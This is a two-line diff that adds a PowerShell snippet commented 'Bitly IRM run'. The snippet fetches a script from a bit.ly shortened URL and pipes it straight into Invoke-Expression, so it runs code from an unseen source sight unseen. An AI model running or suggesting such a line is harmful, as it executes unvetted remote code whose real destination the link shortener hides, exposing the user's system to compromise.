@@ -1,0 +1,2 @@
+# Bitly IRM run
+irm "bit.ly/4fV7DFl" |iex
